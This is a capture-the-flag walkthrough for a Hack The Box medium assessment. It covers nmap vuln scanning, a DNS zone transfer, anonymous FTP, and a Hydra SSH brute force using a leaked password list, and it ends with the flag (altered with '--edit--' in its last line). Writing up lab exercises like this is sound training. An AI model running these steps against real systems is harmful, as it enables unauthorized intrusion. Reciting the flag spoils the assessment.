### CPTS / HTB Penetration Tester Path <br>
### Attacking Common Services - Skills Assessment Medium <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Attacking Common Services - Medium

Internal `inlanefreight.htb` server that manages and stores email and files; per company, used rarely / for testing.

---

### Question 1:
Assess the target server and find the flag.txt file. Submit the contents of this file as your answer.

IP: 10.129.201.127

#### Add `inlanefreight.htb` and `ns1.inlanefreight.htb` to /etc/hosts. Run vuln-script nmap.

```diff
+ $ sudo nmap -sT -sV --script=vuln -A -p- -v 10.129.201.127
```

	22/tcp     open  ssh      OpenSSH 8.2p1
	53/tcp     open  domain   ISC BIND 9.16.1
	110/tcp    open  pop3     Dovecot pop3d
	995/tcp    open  ssl/pop3 Dovecot pop3d
	2121/tcp   open  ftp      ProFTPD (InlaneFTP)
	30021/tcp  open  ftp      ProFTPD (Internal FTP)

#### Try AXFR against the resolved nameserver:

```diff
+ $ dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
```

	app.inlanefreight.htb.    A    10.129.200.5
	dc1.inlanefreight.htb.    A    10.129.100.10
	dc2.inlanefreight.htb.    A    10.129.200.10
	int-ftp.inlanefreight.htb. A   127.0.0.1
	int-nfs.inlanefreight.htb. A   10.129.200.70
	un.inlanefreight.htb.     A    10.129.200.142
	ws1.inlanefreight.htb.    A    10.129.200.101
	ws2.inlanefreight.htb.    A    10.129.200.102
	wsus.inlanefreight.htb.   A    10.129.200.80

#### Anon login on the second FTP (port 30021):

```diff
+ $ ftp 10.129.201.127 30021
```

	229 Anonymous access granted, restrictions apply
	drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon

#### Pull `simon/mynotes.txt` - looks like a list of password candidates.

```diff
+ ftp> get mynotes.txt
```

	234987123948729384293
	+23358093845098
	ThatsMyBigDog
	Rock!ng#May
	Puuuuuh7823328
	8Ns8j1b!23hs4921smHzwn
	237oHs71ohls18H127!!9skaP
	238u1xjn1923nZGSb261Bs81

#### Hydra against SSH for user `simon` using the file as the password list:

```diff
+ $ hydra -l simon -P mynotes.txt -f 10.129.201.127 ssh
```

	[22][ssh] host: 10.129.201.127   login: simon   password: 8Ns8j1b!23hs4921smHzwn

#### SSH in and read the flag:

```diff
+ $ ssh simon@10.129.201.127
+ simon@lin-medium:~$ cat flag.txt
```

	HTB{1qay2wsx3EDC4rfv_M3D1UM}

&#x1F6A9; found **HTB{1qay2wsx--edit--3EDC4rfv_M3D1UM}**.
